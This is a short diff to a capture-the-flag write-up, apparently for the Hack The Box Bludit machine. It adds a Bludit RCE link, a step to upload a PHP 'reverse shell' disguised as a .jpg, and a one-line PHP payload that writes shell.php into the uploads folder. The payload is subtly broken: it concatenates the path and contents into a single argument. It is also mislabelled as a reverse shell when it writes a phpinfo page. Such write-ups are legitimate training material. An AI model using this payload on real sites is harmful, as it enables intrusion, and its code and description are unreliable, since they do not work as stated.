@@ -94,11 +94,9 @@ Nmap done: 1 IP address (1 host up) scanned in 14.23 seconds
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/6fb1a617-4f08-4d12-a236-b860b18cbea5)
 
   - Search for exploits.
+  - Bludit RCE - https://github.com/bludit/bludit/issues/1081
+
+  - Upload a PHP reverse shell as `.jpg` file.
 ```CSS
-▶ searchsploit bludit
+<?php file_put_contents("../../uploads/shell.php"."<?php phpinfo(); ?>"); ?>
 ```
-![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/b6560fa1-49b2-4409-b20f-d6d059c0de38)
-
-  - Steps
-![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/7c56455e-b310-46bb-becb-44d583119589)
-
